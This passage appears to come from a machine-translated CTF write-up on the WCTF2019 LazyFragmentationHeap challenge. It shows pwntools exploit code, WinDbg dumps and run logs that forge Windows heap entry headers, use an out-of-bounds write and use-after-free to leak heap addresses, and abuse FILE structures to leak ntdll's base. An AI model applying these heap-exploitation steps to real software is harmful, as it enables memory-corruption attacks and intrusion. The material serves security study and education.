			<span class="n">alloc</span><span class="p">(</span><span class="mi">3</span><span class="o">+</span><span class="n">k</span><span class="p">,</span> <span class="n">tmp_sz</span><span class="p">)</span>
			<span class="n">leak</span> <span class="o">=</span> <span class="n">show</span><span class="p">(</span><span class="mi">2</span><span class="p">)[</span><span class="n">i</span><span class="p">:]</span>
			<span class="k">if</span> <span class="n">leak</span> <span class="o">!=</span> <span class="s">""</span><span class="p">:</span>
				<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"chunk1 size = 0x%x, chunk2 size = 0x%x"</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">tmp_sz</span><span class="p">))</span>
				<span class="k">break</span>

		<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">"error"</span>
		<span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">6</span><span class="p">))</span>
		<span class="n">hi</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
		<span class="n">hi</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
		<span class="n">sla</span> <span class="o">=</span> <span class="n">hi</span><span class="p">.</span><span class="n">sendlineafter</span>
		<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">"info"</span>

<span class="s">'''
$ python ex.py
[+] Opening connection to 192.168.0.18 on port 6677: Done
[*] i = 0x0080
[*] j = 0x0080
[*] j = 0x00C0
[*] j = 0x0100
[*] j = 0x0140
....
[*] chunk1 size = 0x268, chunk2 size = 0x200
....
'''</span>
</code></pre>
     </div>
    </div>
    <p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Now that you know how to allocate sizes to allocate adjacent chunks, you can fill in the values ​​read </font></font><code class="language-plaintext highlighter-rouge">5. LazyFileHandler</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">from </font></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">magic.txt</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> to ensure there are no null-bytes in between, and then manipulate the header using the OOB write vulnerability.</font></font></p>
    <div class="language-python highlighter-rouge">
     <div class="highlight">
      <pre class="highlight"><code><span class="c1"># skip for brevity...
</span>
<span class="n">alloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">SIZE</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"A"</span> <span class="o">*</span> <span class="n">SIZE</span><span class="p">)</span>
<span class="n">heap_encod</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">show</span><span class="p">(</span><span class="mi">1</span><span class="p">)[</span><span class="n">SIZE</span><span class="p">:]</span> <span class="o">+</span> <span class="s">"</span><span class="se">\x00\x10</span><span class="s">"</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0x1000000d02010003</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"_HEAP-&gt;Encoding = 0x%016x"</span> <span class="o">%</span> <span class="n">heap_encod</span><span class="p">)</span>
<span class="n">alloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x268</span><span class="p">)</span>
<span class="n">alloc</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">)</span>

<span class="n">fake_entry</span> <span class="o">=</span> <span class="mh">0x10000027c80101c8</span> <span class="o">^</span> <span class="n">heap_encod</span>
<span class="s">'''
0x10000027c80101c8
   +0x008 Size             : 0x1c8
   +0x00a Flags            : 0x1 ''
   +0x00b SmallTagIndex    : 0xc8 ''
   +0x00c PreviousSize     : 0x27
   +0x00e SegmentOffset    : 0 ''
   +0x00e LFHFlags         : 0 ''
   +0x00f UnusedBytes      : 0x10 ''
'''</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"fake XOR'ed _HEAP_ENTRY = 0x%016x"</span> <span class="o">%</span> <span class="n">fake_entry</span><span class="p">)</span>

<span class="n">open_file</span><span class="p">()</span>
<span class="n">read_file</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x268</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mh">0x268</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_entry</span><span class="p">)[:</span><span class="mi">6</span><span class="p">],</span> <span class="bp">False</span><span class="p">)</span>
<span class="n">pause</span><span class="p">()</span>

<span class="s">'''
0:001&gt; dqs beefdad0000 lf
00000bee`fdad0000  0000ddaa`beef1acd
00000bee`fdad0008  00000000`000000c8
00000bee`fdad0010  00000000`00000001
00000bee`fdad0018  face6da6`1a35c767
00000bee`fdad0020  00000165`a3ed4370

00000bee`fdad0028  0000ddaa`beef1acd
00000bee`fdad0030  00000000`00000268
00000bee`fdad0038  00000000`00000002
00000bee`fdad0040  face6da6`1a35c767
00000bee`fdad0048  00000165`a3edff40

00000bee`fdad0050  0000ddaa`beef1acd
00000bee`fdad0058  00000000`00000200
00000bee`fdad0060  00000000`00000003
00000bee`fdad0068  0000ddaa`beef1acd
00000bee`fdad0070  00000165`a3ee01b0

0:001&gt; !heap -p -a 00000165`a3ee01b0
    address 00000165a3ee01b0 found in
    _HEAP @ 165a3ed0000
              HEAP_ENTRY Size Prev Flags            UserPtr UserSize - state
        00000165a3ee01a0 01c8 0000  [00]   00000165a3ee01b0    01c70 - (busy)
'''</span>
</code></pre>
     </div>
    </div>
    <p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Now we need to think about how we can exploit this vulnerability.</font></font></p>
    <p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Because only the heap chunk can be manipulated using the OOB vulnerabilities discovered so far, </font></font><a href="https://null2root-github-io.translate.goog/blog/2020/02/07/LazyFragmentationHeap-WCTF2019-writeup.html?_x_tr_sl=hr&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp#310-allocate-and-free-non-lfh-chunk"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.10. </font><font style="vertical-align: inherit;">As explained in Allocate and Free Non-LFH chunk,</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 in the case of Non-LFH chunks, you can use the principle of searching 
for adjacent Heap chunks and coalescing them when deallocating.</font></font></p>
    <p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Therefore,
 if there are other Heap chunks within the size range manipulated by OOB
 write, those chunks are also deallocated, causing UAF to occur and 
leaking the Heap address as shown below.</font></font></p>
    <div class="language-python highlighter-rouge">
     <div class="highlight">
      <pre class="highlight"><code><span class="c1"># skip for brevity...
</span>
<span class="n">alloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">SIZE</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"A"</span> <span class="o">*</span> <span class="n">SIZE</span><span class="p">)</span>
<span class="n">heap_encod</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">show</span><span class="p">(</span><span class="mi">1</span><span class="p">)[</span><span class="n">SIZE</span><span class="p">:]</span> <span class="o">+</span> <span class="s">"</span><span class="se">\x00\x10</span><span class="s">"</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0x1000000d02010003</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"_HEAP-&gt;Encoding = 0x%016x"</span> <span class="o">%</span> <span class="n">heap_encod</span><span class="p">)</span>
<span class="n">alloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x268</span><span class="p">)</span>
<span class="n">alloc</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">)</span>

<span class="n">fake_entry</span> <span class="o">=</span> <span class="mh">0x10000027c80101c8</span> <span class="o">^</span> <span class="n">heap_encod</span>
<span class="s">'''
0x10000027c80101c8
   +0x008 Size             : 0x1c8
   +0x00a Flags            : 0x1 ''
   +0x00b SmallTagIndex    : 0xc8 ''
   +0x008 SubSegmentCode   : 0xc80101c8
   +0x00c PreviousSize     : 0x27
   +0x00e SegmentOffset    : 0 ''
   +0x00e LFHFlags         : 0 ''
   +0x00f UnusedBytes      : 0x10 ''
'''</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"fake XOR'ed _HEAP_ENTRY = 0x%016x"</span> <span class="o">%</span> <span class="n">fake_entry</span><span class="p">)</span>

<span class="n">alloc</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mh">0x1c80</span> <span class="o">-</span>  <span class="c1"># fake chunk size 
</span>         <span class="mh">0x20</span>   <span class="o">-</span>  <span class="c1"># sizeof(_HEAP_ENTRY) * 2
</span>		 <span class="mh">0x200</span>     <span class="c1"># original size of overwritten chunk
</span><span class="p">)</span> 

<span class="n">open_file</span><span class="p">()</span>
<span class="n">read_file</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x268</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mh">0x268</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_entry</span><span class="p">)[:</span><span class="mi">6</span><span class="p">],</span> <span class="bp">False</span><span class="p">)</span>

<span class="n">free</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>         <span class="c1"># free coalesce mechanism also free'ing chunk 4
</span><span class="n">alloc</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">)</span> <span class="c1"># set Flink and Blink at chunk 4
</span>
<span class="n">heap_leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">show</span><span class="p">(</span><span class="mi">4</span><span class="p">)[:</span><span class="mi">8</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)))</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"leaked heap addr = 0x%016x"</span> <span class="o">%</span> <span class="n">heap_leak</span><span class="p">)</span>
<span class="n">pause</span><span class="p">()</span>

<span class="s">'''
[+] Opening connection to 192.168.0.18 on port 6677: Done
[*] _HEAP-&gt;Encoding = 0x0000d60f1a72815a
[*] fake XOR'ed _HEAP_ENTRY = 0x1000d628d2738092
[*] leaked heap addr = 0x000002478ae70150
[*] Paused (press any to continue)
....
0:001&gt; dqs beefdad0000 l14
....
00000bee`fdad0078  0000ddaa`beef1acd
00000bee`fdad0080  00000000`00001a60
00000bee`fdad0088  00000000`00000004
00000bee`fdad0090  0000ddaa`beef1acd
00000bee`fdad0098  00000247`8ae803c0
0:001&gt; dqs 247`8ae803c0 l2
00000247`8ae803c0  00000247`8ae70150
00000247`8ae803c8  00000247`8ae82e40
0:001&gt; !heap
        Heap Address      NT/Segment Heap

         2478ae70000              NT Heap
         2478ac10000              NT Heap
         2478b0a0000              NT Heap
'''</span>
</code></pre>
     </div>
    </div>
    <p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Because the offset of the leaked heap address </font><font style="vertical-align: inherit;">is always fixed at 0x150 ( </font></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">_HEAP-&gt;FreeLists</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) , you can reliably obtain the address of the </font></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">_HEAP structure that manages heap chunks.</font></font></strong><font style="vertical-align: inherit;"></font></p>
    <p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">One of the interesting things I learned while analyzing is that </font></font><code class="language-plaintext highlighter-rouge">5. LazyFileHandler</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">when a FILE structure is created </font></font><code class="language-plaintext highlighter-rouge">1. ReadFile</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">for </font></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">magic.txt</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , the structure is allocated to the heap area where LFH is enabled.</font></font></p>
    <div class="language-plaintext highlighter-rouge">
     <div class="highlight">
      <pre class="highlight"><code>0:001&gt; dqs lazyfragmentationheap+5628 l1
00007ff6`521f5628  000001b7`d069a8b0

0:001&gt; !heap -i 000001b7`d069a8b0-10
Detailed information for block entry 000001b7d069a8a0
Assumed heap       : 0x000001b7d0690000 (Use !heap -i NewHeapHandle to change)
Header content     : 0xE76D0D32 0x88000D43
Block flags        : 0x1 LFH (busy )
Total block size   : 0x6 units (0x60 bytes)
Requested size     : 0x58 bytes (unused 0x8 bytes)
Subsegment         : 0x000001b7d069bb90
</code></pre>
     </div>
    </div>
    <p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">When LFH generates more Heap chunks than </font></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">_HEAP_SUBSEGMENT-&gt;BlockCount,</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> it allocates and uses a new UserBlock and SubSegment. </font><font style="vertical-align: inherit;">If
 you use this principle to make LFH use chunk 4, which can be accessed 
by UAF, you can manipulate the FILE structure as follows.</font></font></p>
    <div class="language-python highlighter-rouge">
     <div class="highlight">
      <pre class="highlight"><code><span class="c1"># skip for brevity...
</span>
<span class="n">alloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">SIZE</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"A"</span> <span class="o">*</span> <span class="n">SIZE</span><span class="p">)</span>
<span class="k">try</span><span class="p">:</span>
	<span class="n">heap_encod</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">show</span><span class="p">(</span><span class="mi">1</span><span class="p">)[</span><span class="n">SIZE</span><span class="p">:]</span> <span class="o">+</span> <span class="s">"</span><span class="se">\x00\x10</span><span class="s">"</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0x1000000d02010003</span>
<span class="k">except</span> <span class="n">struct</span><span class="p">.</span><span class="n">error</span><span class="p">:</span>
	<span class="n">log</span><span class="p">.</span><span class="n">error</span><span class="p">(</span><span class="s">"_HEAP_ENTRY not leaked"</span><span class="p">)</span>
	<span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>

<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"_HEAP-&gt;Encoding = 0x%016x"</span> <span class="o">%</span> <span class="n">heap_encod</span><span class="p">)</span>
<span class="n">alloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x268</span><span class="p">)</span>
<span class="n">alloc</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">)</span>

<span class="n">fake_entry</span> <span class="o">=</span> <span class="mh">0x10000027c80101c8</span> <span class="o">^</span> <span class="n">heap_encod</span>
<span class="s">'''
0x10000027c80101c8
   +0x008 Size             : 0x1c8
   +0x00a Flags            : 0x1 ''
   +0x00b SmallTagIndex    : 0xc8 ''
   +0x008 SubSegmentCode   : 0xc80101c8
   +0x00c PreviousSize     : 0x27
   +0x00e SegmentOffset    : 0 ''
   +0x00e LFHFlags         : 0 ''
   +0x00f UnusedBytes      : 0x10 ''
'''</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"fake XOR'ed _HEAP_ENTRY = 0x%016x"</span> <span class="o">%</span> <span class="n">fake_entry</span><span class="p">)</span>

<span class="n">alloc</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mh">0x1c80</span> <span class="o">-</span>  <span class="c1"># fake chunk size 
</span>         <span class="mh">0x20</span>   <span class="o">-</span>  <span class="c1"># sizeof(_HEAP_ENTRY) * 2
</span>         <span class="mh">0x200</span>     <span class="c1"># orginal size of overwritten chunk
</span><span class="p">)</span> 

<span class="n">open_file</span><span class="p">()</span>
<span class="n">read_file</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x268</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mh">0x268</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_entry</span><span class="p">)[:</span><span class="mi">6</span><span class="p">],</span> <span class="bp">False</span><span class="p">)</span>

<span class="n">free</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>         <span class="c1"># free coalesce mechanism also free'ing chunk 4
</span><span class="n">alloc</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">)</span> <span class="c1"># set Flink and Blink at chunk 4
</span>
<span class="n">heap_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">show</span><span class="p">(</span><span class="mi">4</span><span class="p">)[:</span><span class="mi">8</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)))</span> <span class="o">-</span> <span class="mh">0x150</span>
<span class="k">if</span> <span class="n">heap_base</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
	<span class="n">log</span><span class="p">.</span><span class="n">error</span><span class="p">(</span><span class="s">"Heap address not leaked"</span><span class="p">)</span>
	<span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>

<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"&amp;_HEAP = 0x%016x"</span> <span class="o">%</span> <span class="n">heap_base</span><span class="p">)</span>

<span class="c1"># make LFH to allocate new Userblock in chunk 4
</span><span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x14</span><span class="p">):</span>
	<span class="n">open_file</span><span class="p">()</span>

<span class="n">pause</span><span class="p">()</span>

<span class="s">'''
0:001&gt; dqs beefdad0000+(0x28*3) l5
00000bee`fdad0078  0000ddaa`beef1acd
00000bee`fdad0080  00000000`00001a60 &lt;------------|
00000bee`fdad0088  00000000`00000004              |
00000bee`fdad0090  0000ddaa`beef1acd              |
00000bee`fdad0098  00000128`446003c0              |---- profit!
0:001&gt; dqs lazyfragmentationheap+5628 l1          |
00007ff7`6f405628  00000128`44600950              |
0:001&gt; ? 00000128`44600950-00000128`446003c0      |
Evaluate expression: 1424 = 00000000`00000590 &lt;---|
'''</span>
</code></pre>
     </div>
    </div>
    <p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Attack techniques using the FILE structure are well-documented in </font></font><a href="https://translate.google.com/website?sl=hr&amp;tl=en&amp;hl=en&amp;client=webapp&amp;u=https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Play with FILE Structure - Yet Another Binary Exploit Technique</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 written by Angelboy , but the explanation is based on Linux, so it is 
slightly different from the FILE structure on Windows, but this part is 
immediately visible when viewed with a debugger, so FILE It is not that 
difficult to analyze what structure a structure has.</font></font></p>
    <p><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Since we know the address of the _HEAP</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> structure , let’s start by leaking the address of </font></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ntdll.dll,</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> which can be found near the structure .</font></font></p>
    <div class="language-python highlighter-rouge">
     <div class="highlight">
      <pre class="highlight"><code><span class="c1"># skip for brevity...
</span>
<span class="c1"># make LFH to allocate new Userblock in chunk 4
</span><span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x14</span><span class="p">):</span>
	<span class="n">open_file</span><span class="p">()</span>

<span class="n">fake_HEAP_USERDATA_HEADER</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">fake_HEAP_USERDATA_HEADER</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0xbcd0</span><span class="p">)</span>   <span class="c1"># +0x000 SubSegment
</span><span class="n">fake_HEAP_USERDATA_HEADER</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x12e40</span><span class="p">)</span>  <span class="c1"># +0x008 Reserved
</span><span class="n">fake_HEAP_USERDATA_HEADER</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xc</span><span class="p">)</span>                  <span class="c1"># +0x010 SizeIndexAndPadding
</span><span class="n">fake_HEAP_USERDATA_HEADER</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xf0e0d0c0</span><span class="p">)</span>           <span class="c1"># +0x014 Signature
</span><span class="n">fake_HEAP_USERDATA_HEADER</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">5</span>                <span class="c1"># I couldn't leak other values
</span>
<span class="n">fake_FILE</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span>              <span class="c1"># _HEAP_ENTRY
</span><span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x2C0</span><span class="p">)</span>  <span class="c1"># cursor of SEEK_CUR, _HEAP-&gt;LockVariable-&gt;Lock
</span><span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span><span class="p">)</span>          <span class="c1"># base address, &amp;_HEAP
</span><span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x800</span><span class="p">)</span>              <span class="c1"># remaining file size
</span><span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x2041</span><span class="p">)</span>             <span class="c1"># I dunno what they are
</span><span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x17</span><span class="p">)</span>				
<span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span>
<span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xffffffffffffffff</span><span class="p">)</span>
<span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xffffffff</span><span class="p">)</span>
<span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="n">for_leak</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">for_leak</span> <span class="o">+=</span> <span class="n">fake_HEAP_USERDATA_HEADER</span>
<span class="n">for_leak</span> <span class="o">+=</span> <span class="n">fake_FILE</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0x1000</span> <span class="o">/</span> <span class="nb">len</span><span class="p">(</span><span class="n">fake_FILE</span><span class="p">))</span>

<span class="n">edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="n">for_leak</span><span class="p">)</span>
<span class="n">alloc</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="n">SIZE</span><span class="p">)</span>
<span class="n">read_file</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span><span class="mi">8</span><span class="p">)</span>
<span class="n">ntdll_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">show</span><span class="p">(</span><span class="mi">5</span><span class="p">)[:</span><span class="mi">8</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)))</span> <span class="o">-</span> <span class="mh">0x163d70</span>

<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"&amp;ntdll = 0x%016x"</span> <span class="o">%</span> <span class="n">ntdll_base</span><span class="p">)</span>

<span class="n">pause</span><span class="p">()</span>
<span class="n">hi</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>

<span class="s">'''
[+] Opening connection to 192.168.0.18 on port 6677: Done
[*] _HEAP-&gt;Encoding = 0x0000b6942c981917
[*] fake XOR'ed _HEAP_ENTRY = 0x1000b6b3e49918df
[*] &amp;_HEAP = 0x0000018809710000
[*] &amp;ntdll = 0x00007ffd09b00000
[*] Paused (press any to continue)
....
0:001&gt; ? ntdll
Evaluate expression: 140724765982720 = 00007ffd`09b00000
'''</span>
</code></pre>
     </div>
    </div>
    <p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">And I found out by continuing to leak addresses. I don't know the exact reason, but even if the process changed, </font><font style="vertical-align: inherit;">the addresses of loaded modules, including </font></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LazyFragmentationHeap.exe , did not change.</font></font></strong><font style="vertical-align: inherit;"></font></p>
    <div class="language-plaintext highlighter-rouge">
     <div class="highlight">
      <pre class="highlight"><code>$ python ex.py
[+] Opening connection to 192.168.0.18 on port 6677: Done
[*] _HEAP-&gt;Encoding = 0x0000ded8a1942b54
[*] fake XOR'ed _HEAP_ENTRY = 0x1000deff69952a9c
[*] &amp;_HEAP = 0x000001c50e7e0000
[*] &amp;ntdll = 0x00007ffd09b00000 &lt;------------------------------|
[*] Closed connection to 192.168.0.18 port 6677                |
                                                               |
$ python ex.py                                                 |
[+] Opening connection to 192.168.0.18 on port 6677: Done      |
[*] _HEAP-&gt;Encoding = 0x000072da0f33e8bf                       |
[*] fake XOR'ed _HEAP_ENTRY = 0x100072fdc732e977               |
[*] &amp;_HEAP = 0x0000019898950000                                |
[*] &amp;ntdll = 0x00007ffd09b00000 &lt;------------------------------|
</code></pre>
     </div>
    </div>
    <p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Since
 there is a limit to the number of times data is read through the FILE 
structure anyway, address leaks using the FILE structure can only occur 
once per process, so I modified the code as follows.</font></font></p>
    <div class="language-python highlighter-rouge">
     <div class="highlight">
      <pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c1"># context.log_level = "debug"
</span>
<span class="c1"># HOST = "192.168.56.102" # VirtualBox Host-Only Adapter
</span><span class="n">HOST</span> <span class="o">=</span> <span class="s">"192.168.0.18"</span> <span class="c1"># VirtualBox Bridge 
</span><span class="n">PORT</span> <span class="o">=</span> <span class="mi">6677</span>
<span class="n">SIZE</span> <span class="o">=</span> <span class="mh">0xC8</span> <span class="c1"># yes, I intend korean slang
</span>
<span class="n">hi</span> <span class="o">=</span> <span class="bp">None</span>
<span class="n">sla</span> <span class="o">=</span> <span class="bp">None</span>

<span class="k">def</span> <span class="nf">alloc</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">,</span> <span class="n">size</span><span class="p">):</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
 	<span class="n">sla</span><span class="p">(</span><span class="s">"Size:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"ID:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">,</span> <span class="n">val</span><span class="p">,</span> <span class="n">need_newline</span><span class="o">=</span><span class="bp">True</span><span class="p">):</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">2</span><span class="p">))</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"ID:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">))</span>
	<span class="k">if</span> <span class="n">need_newline</span><span class="p">:</span>
		<span class="n">sla</span><span class="p">(</span><span class="s">"Content:"</span><span class="p">,</span> <span class="n">val</span><span class="p">)</span>
	<span class="k">else</span><span class="p">:</span>
		<span class="n">hi</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">"Content:"</span><span class="p">,</span> <span class="n">val</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">):</span>
